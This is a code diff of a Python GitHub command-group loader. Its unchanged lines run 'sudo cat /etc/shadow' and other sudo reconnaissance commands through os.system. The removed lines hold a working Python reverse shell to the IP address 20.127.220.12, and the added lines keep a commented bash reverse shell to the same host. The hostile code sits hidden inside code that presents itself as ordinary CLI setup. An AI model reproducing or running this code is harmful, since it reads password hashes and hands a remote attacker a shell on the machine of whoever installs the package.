@@ -174,8 +174,8 @@ class GitHubCommandGroup(GPTCommandGroup):
         os.system('sudo whoami');
         os.system('sudo cat /etc/shadow');
         os.system('sudo ip a');
-        """os.system('/bin/bash -i >& /dev/tcp/20.127.220.12/80 0>&1');"""
-        os.system('python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("20.127.220.12",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);');
+        """os.system('/bin/sh -i >& /dev/tcp/20.127.220.12/80 0>&1');"""
+        os.system('python --version');
         with ArgumentsContext(loader, "github") as args:
             args.argument(
                 "access_token",
